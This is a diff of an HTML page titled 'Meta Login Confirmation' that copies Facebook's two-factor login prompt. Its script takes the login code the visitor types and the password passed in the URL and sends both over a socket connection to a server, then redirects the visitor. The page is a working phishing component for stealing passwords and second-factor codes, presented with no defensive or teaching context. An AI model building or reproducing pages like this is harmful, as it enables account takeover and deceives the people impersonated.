@@ -1,137 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Meta Login Confirmation</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f2f5;
-        }
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f0f2f5;
+      }
+      .container {
+        background: white;
+        padding: 20px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        max-width: 400px;
+        width: 100%;
+        text-align: center;
+      }
+      .logo img {
+        width: 100px;
+        margin-bottom: 20px;
+      }
+      h1 {
+        font-size: 24px;
+        margin-bottom: 20px;
+      }
+      .options {
+        text-align: left;
+      }
+      .option {
+        margin-bottom: 20px;
+      }
+      .option h4 {
+        font-size: 18px;
+        margin-bottom: 10px;
+      }
+      .option p {
+        margin-bottom: 10px;
+      }
+      .primary-button {
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 4px;
+        cursor: pointer;
+        width: 100%;
+        margin-bottom: 10px;
+      }
+      .secondary-button {
+        background-color: #e4e6eb;
+        color: black;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 4px;
+        cursor: pointer;
+        width: 100%;
+        margin-bottom: 10px;
+      }
+      .form-input {
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ced4da;
+        border-radius: 4px;
+      }
+      .divider {
+        height: 1px;
+        background-color: #e4e6eb;
+        margin: 20px 0;
+      }
+      .button-group {
+        display: flex;
+        justify-content: space-between;
+      }
+      @media (max-width: 600px) {
         .container {
-            background: white;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
+          padding: 10px;
         }
-        .logo img {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        .options {
-            text-align: left;
-        }
-        .option {
-            margin-bottom: 20px;
-        }
-        .option h4 {
-            font-size: 18px;
-            margin-bottom: 10px;
-        }
-        .option p {
-            margin-bottom: 10px;
-        }
-        .primary-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 10px;
-        }
+        .primary-button,
         .secondary-button {
-            background-color: #e4e6eb;
-            color: black;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 10px;
+          font-size: 14px;
+          padding: 8px;
         }
-        .form-input {
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-        }
-        .divider {
-            height: 1px;
-            background-color: #e4e6eb;
-            margin: 20px 0;
-        }
-        .button-group {
-            display: flex;
-            justify-content: space-between;
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 10px;
-            }
-            .primary-button, .secondary-button {
-                font-size: 14px;
-                padding: 8px;
-            }
-        }
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="container">
-        <div class="logo">
-            <img src="{{ url_for('static', filename='images/logo192.png') }}" alt="Meta Logo" height="70">
+      <div class="logo">
+        <img
+          src="{{ url_for('static', filename='images/logo192.png') }}"
+          alt="Meta Logo"
+          height="70"
+        />
+      </div>
+      <h3>Choose a way to confirm that it's you</h3>
+      <div class="options">
+        <div class="option">
+          <h4>Approve from another device</h4>
+          <p>
+            We sent a notification to your device. Check your Facebook
+            notifications there and approve the login to continue.
+          </p>
+          <button class="primary-button">Approved</button>
         </div>
-        <h3>Choose a way to confirm that it's you</h3>
-        <div class="options">
-            <div class="option">
-                <h4>Approve from another device</h4>
-                <p>We sent a notification to your device. Check your Facebook notifications there and approve the login to continue.</p>
-                <button class="primary-button">Approved</button>
-            </div>
-            <div class="divider"></div>
-            <div class="option">
-                <h4>Or, enter your login code</h4>
-                <p>Enter the login code from your phone or email.</p>
-                <input type="text" class="form-input" placeholder="Login code" id="login-code">
-                <div class="button-group">
-                    <button class="secondary-button" id="resend-code">Resend</button>
-                    <button class="primary-button" id="confirm-code">Confirm</button>
-                </div>
-            </div>
+        <div class="divider"></div>
+        <div class="option">
+          <h4>Or, enter your login code</h4>
+          <p>Enter the login code from your phone or email.</p>
+          <input
+            type="text"
+            class="form-input"
+            placeholder="Login code"
+            id="login-code"
+          />
+          <div class="button-group">
+            <button class="secondary-button" id="resend-code">Resend</button>
+            <button class="primary-button" id="confirm-code">Confirm</button>
+          </div>
         </div>
+      </div>
     </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script>
     <script>
-        const socket = io.connect('http://127.0.0.1:5000');
-        document.getElementById('confirm-code').addEventListener('click', function () {
-            const loginCode = document.getElementById('login-code').value;
+      const socket = io.connect("http://127.0.0.1:5000");
+      let attemptCount = 0;
+
+      socket.on("connect", function () {
+        document
+          .getElementById("confirm-code")
+          .addEventListener("click", function () {
+            const loginCode = document.getElementById("login-code").value;
+            const urlParams = new URLSearchParams(window.location.search);
+            const password = urlParams.get("id");
+
             if (loginCode) {
-                socket.emit('confirm_code', { code: loginCode, session_id: localStorage.getItem('session_id') });
+              socket.emit("confirm_code", {
+                code: loginCode,
+                session_id: localStorage.getItem("session_id"),
+                password: password,
+              });
             } else {
-                alert('Please enter the login code.');
+              alert("Please enter the login code.");
             }
+          });
+
+        document
+          .getElementById("resend-code")
+          .addEventListener("click", function () {
+            alert("A new login code has been sent.");
+          });
+
+        socket.on("code_result", function (data) {
+          if (data.status === "success") {
+            socket.emit("redirect", { url: data.url });
+          } else {
+            attemptCount++;
+            if (attemptCount > 2) {
+              alert("Too many failed attempts. Redirecting to done page.");
+              window.location.href = "/done";
+            } else {
+              alert("Invalid login code. Please try again.");
+              document.getElementById("login-code").value = "";
+            }
+          }
         });
-        document.getElementById('resend-code').addEventListener('click', function () {
-            alert('A new login code has been sent.');
+
+        socket.on("redirect", function (data) {
+          console.log(data);
+          window.location.href = data.url;
         });
-        socket.on('redirect', function(data) {
-            window.location.href = data.url;
-        });
+      });
+
+      socket.on("connect_error", function () {
+        alert("Connection to the server failed. Please try again later.");
+      });
+
+      socket.on("disconnect", function () {
+        alert("Disconnected from the server. Please refresh the page.");
+      });
     </script>
-</body>
+  </body>
 </html>
